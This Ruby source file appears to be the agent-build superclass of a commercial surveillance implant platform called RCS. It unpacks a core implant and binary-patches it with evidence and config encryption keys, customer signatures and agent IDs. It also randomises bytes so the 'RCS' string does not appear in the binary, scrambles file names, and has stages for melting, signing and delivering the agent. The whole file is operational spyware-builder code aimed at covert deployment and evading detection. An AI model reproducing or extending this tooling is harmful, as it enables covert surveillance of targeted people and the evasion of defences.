#
#  Agent creation superclass
#

require_relative 'exec'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/binary'

require 'fileutils'
require 'tmpdir'
require 'zip'
require 'zip/filesystem'
require 'securerandom'

module RCS
module DB

class Build
  include RCS::Tracer

  attr_reader :outputs
  attr_reader :scrambled
  attr_reader :funcnames
  attr_reader :platform
  attr_reader :tmpdir
  attr_reader :factory
  attr_reader :core_filepath

  @builders = {}

  def self.register(klass)
    if klass.to_s.start_with? "Build" and klass.to_s != 'Build'
      plat = klass.to_s.downcase
      plat['build'] = ''
      @builders[plat.to_sym] = RCS::DB.const_get(klass)
    end
  end

  def initialize
    @outputs = []
    @scrambled = {}
    @tmpdir = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
    trace :debug, "Build: init: #{@tmpdir}"
    Dir.mkdir @tmpdir
  end

  def self.factory(platform)
    begin
      @builders[platform].new
    rescue Exception => e
      raise "Builder for #{platform} : #{e.message}"
    end
  end

  def load(params)
    core = ::Core.where({name: @platform}).first
    raise "Core for #{@platform} not found" if core.nil?

    @core_filepath = GridFS.to_tmp core[:_grid]
    trace :info, "Build: loaded core: #{@platform} #{core.version} #{File.size(@core_filepath)} bytes"

    return if params.blank?

    @factory = ::Item.where({_kind: 'factory', _id: params['_id']}).first
    raise "Factory #{params['ident']} not found" if @factory.nil?
    trace :debug, "Build: loaded factory: #{@factory.name}"
    raise "Factory too old cannot be created" unless @factory.good
  end

  def unpack
    trace :debug, "Build: unpack: #{@core_filepath}"

    Zip::File.open(@core_filepath) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))

        # skip empty dirs
        next if File.directory?(f.name)

        z.extract(f, f_path) unless File.exist?(f_path)
        @outputs << f.name
      end
    end

    # delete the tmpfile of the core
    FileUtils.rm_rf @core_filepath
  end

  def hash_and_salt value
    Digest::MD5.digest(value) + SecureRandom.random_bytes(16)
  end

  def patch(params)
    # skip the phase if not needed
    return if params.nil? or params[:core].nil?

    trace :debug, "Build: patching [#{params[:core]}] file"

    # open the core and binary patch the parameters
    file = File.open(path(params[:core]), 'rb+')
    content = file.read

    # evidence encryption key
    begin
      key = hash_and_salt @factory.logkey
      content.binary_patch 'WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg', key
    rescue
      raise "Evidence key marker not found"
    end

    # conf encryption key
    begin
      key = hash_and_salt @factory.confkey
      content.binary_patch '6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY', key
    rescue
      raise "Config key marker not found"
    end

    # per-customer signature
    begin
      sign = ::Signature.where({scope: 'agent'}).first
      signature = hash_and_salt sign.value

      marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
      magic = license_magic + marker.slice(8..-1)

      content.binary_patch magic, signature
    rescue Exception => e
      raise "Signature marker not found: #{e.message}"
    end

    # Agent ID
    begin
      id = @factory.ident.dup
      # first three bytes are random to avoid the RCS string in the binary file
      id['RCS_'] = SecureRandom.hex(2)
      content.binary_patch 'EMp7Ca7-fpOBIr', id
    rescue Exception => e
      raise "Agent ID marker not found: #{e.message}"
    end

    # demo parameters
    begin
      content.binary_patch 'Pg-WaVyPzMMMMmGbhP6qAigT', SecureRandom.random_bytes(24) unless params['demo']
    rescue
      raise "Demo marker not found"
    end

    # magic random seed (magic + random)
    begin
      magic = license_magic + SecureRandom.urlsafe_base64(32)
      magic = magic.slice(0..31)
      content.binary_patch 'B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW', magic
    rescue
      raise "WMarker not found"
    end

    if File.size(path(params[:core])) != content.bytesize
      raise "BUG: misaligned binary patch: #{File.size(path(params[:core]))} #{content.bytesize}"
    end

    file.rewind
    file.write content
    file.close
    
    if params[:config]
      trace :debug, "Build: saving config to [#{params[:config]}] file"

      # retrieve the config and save it to a file
      config = @factory.configs.first.encrypted_config(@factory.confkey)
      File.open(path(params[:config]), 'wb') {|f| f.write config}

      @outputs << params[:config]
    end
  end

  def patch_file(params)
    # open the file for binary patch
    file = File.open(path(params[:file]), 'rb+')
    content = file.read

    # pass the content to the caller and save its modification
    content = yield content

    file.rewind
    file.write content
    file.close
  end

  def scramble_name(name, offset)
   alphabet = '_BqwHaF8TkKDMfOzQASx4VuXdZibUIeylJWhj0m5o2ErLt6vGRN9sY1n3Ppc7g-C'

   offset %= alphabet.size
   offset = offset != 0 ? offset : 1

   ret = ''

   name.each_char do |c|
     index = alphabet.index c
     ret += index.nil? ? c : alphabet[(index + offset) % alphabet.size]
   end

   return ret
  end

  def scramble
    # skip the phase if not needed
    return if @scrambled.empty?

    # rename the outputs with the scrambled names
    @outputs.each do |file|
      if @scrambled[file.to_sym]
        File.rename(path(file), path(@scrambled[file.to_sym]))
        @outputs[@outputs.index(file)] = @scrambled[file.to_sym]
      end
    end
    trace :debug, "Build: scrambled: #{@outputs.inspect}"
  end

  def melt(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def generate(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def sign(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def pack(params)
    trace :debug, "Build: skipping #{__method__}"
  end

  def deliver(params)
    trace :debug, "Build: skipping #{__method__}"
  end
  
  def path(name)
    File.join @tmpdir, name
  end

  def license_magic
    LicenseManager.instance.limits[:magic]
  end

  def add_magic(content)
    # per-customer signature
    begin
      marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
      magic = license_magic + marker.slice(8..-1)
      content.binary_patch marker, magic
    rescue
      raise "Signature marker not found"
    end
  end

  def clean
    if @tmpdir
      trace :debug, "Build: cleaning up #{@tmpdir}"
      FileUtils.rm_rf @tmpdir
    end
  end

  def archive_mode?
    LicenseManager.instance.check :archive
  end

  def create(params)
    trace :debug, "Building Agent: #{params}"

    # if we are in archive mode, no build is allowed
    raise "Cannot build on this system" if archive_mode?

    begin
      load params['factory']
      unpack
      generate params['generate']
      patch params['binary']
      scramble
      melt params['melt']
      sign params['sign']
      pack params['package']
      deliver params['deliver']
    rescue Exception => e
      trace :error, "Cannot build: #{e.message}"
      trace :error, "Parameters: #{params.inspect}"
      trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
      clean
      raise e
    end
  end
end

# require all the builders
Dir[File.dirname(__FILE__) + '/build/*.rb'].each do |file|
  require file
end

# register all builders into Build
RCS::DB.constants.keep_if{|x| x.to_s.start_with? 'Build'}.each do |klass|
  RCS::DB::Build.register klass
end

end #DB::
end #RCS::
